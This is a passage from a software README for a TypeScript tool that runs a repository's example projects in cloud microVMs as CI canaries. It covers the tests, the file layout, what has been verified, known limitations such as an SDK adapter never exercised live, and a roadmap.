  directly, so the only way to test 425-vs-401 was to reach across the network.
  It now takes a `fetchImpl` seam, and the polling semantics are asserted in
  [`test/preview.test.ts`](test/preview.test.ts) instead of hoped for.
- **A clone failure leaked the prep machine.** If `git clone` threw during prep,
  the error propagated before `kill()`, leaving a microVM billing until its idle
  timeout fired. Prep teardown moved into a `finally`.

The 31 adapter tests in [`test/real.test.ts`](test/real.test.ts) are a different
kind of test: they inject a `ModuleLoader` returning a hand-built fake shaped from
the published 0.1.2 typings, then assert the mapping. `commands.run` gets argv in
`args`, not a shell string. Desktop `exec` has no `env` field, so env vars go
through `sh -lc` with every value `shellQuote`d. `resolution` is the string
`"1280x800"`, not a tuple. `kill()` — not `close()` — is what actually stops
paying for a sandbox. Two wire bugs were caught this way, before any live call:
a missing default `baseUrl` that would have sent every request to
`undefined/sandboxes`, and `region` being passed to the sandbox and desktop
clients, which do not understand it.

## 8. Project layout

```
src/
  cli.ts             185   flag parsing, exit codes, stdout
  config.ts          249   load + validate canary.json, apply defaults
  discover.ts        181   walk examples/, infer runtime and command
  runner.ts          686   the orchestrator: prep, snapshot, fan-out, verdicts
  index.ts            56   public library surface
  solari/
    types.ts         139   the port — Machine, MachinePool, Clock, BrowserProbe
    real.ts          393   the only file that imports @solarisdk/*
    fake.ts          266   in-memory pool used by every orchestrator test
  verify/
    http.ts           98   preview polling, 425/401 semantics
    visual.ts         52   desktop screenshot capture
    expect.ts         27   stdout matching
  util/
    classify.ts       84   verdict precedence
    command.ts       105   argv tokenizer, shell quoting
    concurrency.ts    72   bounded parallel map
    redact.ts         80   shape-based secret scrubbing
  report/
    markdown.ts      111   job summary and PR comment
    html.ts          138   standalone dashboard
    json.ts           34   machine-readable results
test/                     6 files, 2038 lines, 125 tests
.github/workflows/        test.yml (free gate) + canary.yml (real VMs)
docs/                     GitHub Pages: the live sample dashboard
canary.json               the config this repo runs against itself
```

## 9. Project status, limitations, roadmap

### 9.1 What is verified

| | |
| --- | --- |
| 125 tests / 25 suites | green, ~1.5s, no network |
| `tsc --strict --noEmit` | clean, zero `any` in `src/` |
| CI | [`test.yml`](.github/workflows/test.yml) green on every push, with no SDK peers installed |
| `--dry-run` | exercised against this repo's own `canary.json` |
| error paths | bad config, missing example, unknown runtime, hung command, blown budget — all covered by tests |

### 9.2 Known limitations

**The SDK adapter is un-mocked, not unproven — and that distinction matters.**
[`src/solari/real.ts`](src/solari/real.ts) has never made a live call. No
`SOLARI_API_KEY` was available while it was written, so every mapping in it was
derived from the published `@solarisdk/*` 0.1.2 typings and is asserted against a
hand-built fake ([§7](#7-tests)) rather than against the service. The design
deliberately concentrates that risk: it is the *only* file that imports an SDK, it
is ~390 lines, and each mapping carries a comment naming the SDK surface it
targets. Everything above it — discovery, prep, fan-out, retries, classification,
budget, reporting — is proved end to end. If a method name drifted between the
typings and the wire, the symptom is a first-request failure in one known file,
not a subtle wrong answer. Two such bugs were already found and fixed by reading
the typings closely; a live run remains the only way to close it out, and it is
the top item on the roadmap.

Beyond that:

- **`startBackground().wait()` returns `0` immediately.** The real
  `CommandHandle` exposes a `wait()` that resolves on process exit; the adapter
  does not thread it through, so `running()` only flips to `false` after an
  explicit `kill()`. Background processes are used for dev servers that are
  supposed to stay up while a preview URL is polled, so nothing depends on this
  today — but a server that crashes on boot will look alive until the preview
  poll times out, which is a slower and less obvious failure than it should be.
- **`setIdleTimeout` is on the port and both adapters, and the runner never calls
  it.** The idle window is set once at machine creation via `MachineSpec`, which
  covers the normal case. Extending a window mid-run — a long install, a slow
  first build — is not wired up.
- **Desktop examples do not fork the snapshot.** The prep snapshot is a headless
  sandbox image, so an example that needs a desktop
  ([`runner.ts:326`](src/runner.ts:326)) gets a fresh VM and pays for its own
  clone and install. Correct, just the slowest and most expensive path.
- **Prep installs are sequential.** One example with a pathological install
  blocks every other example's install, because they all share the single prep
  machine before the snapshot is taken. Deliberate — parallel installs in one
  VM fight over the package cache — but it is the main lever on wall-clock time.
- **Python support is `pip` only.** `requirements.txt` or `pyproject.toml`,
  installed into the system interpreter. No venv, poetry, uv, or conda.
- **Reporting is GitHub-shaped.** Job summaries, PR comments, Pages. The JSON
  report is neutral enough to feed anything else, but there is no Slack, no
  webhook, no exporter.

### 9.3 Roadmap

Ordered by what would actually help, not by what is easiest:

1. **A live run, committed as evidence.** One canary against the real cookbook
   with a real key, with `canary-out/` published to `docs/live-run/`. This closes
   §9.2's first item and is the only item that cannot be done without credentials.
2. **Thread `CommandHandle.wait()` through `startBackground`.** Makes a dev server
   that dies on boot fail fast and loudly instead of timing out a preview poll.
3. **Per-example snapshots.** Snapshot after each install rather than once after
   all of them, so a slow install is paid for once, by one example, forever.
4. **A desktop base snapshot**, so GUI examples stop re-cloning the repo.
5. **Real Python isolation** — a venv per example, and uv when a lockfile is
   present.
6. **`--since <ref>`**, running only the examples whose files changed. The
   snapshot machinery already makes a partial run cheap; discovery just has no
   notion of a diff.
7. **A generic webhook reporter**, so the JSON report can reach somewhere that is
   not GitHub.
8. **Flake tracking across runs.** A verdict history would turn "this failed
   once" into "this fails 30% of the time", which is the number you actually want
   before deleting an example.

## License

MIT — see [LICENSE](LICENSE).
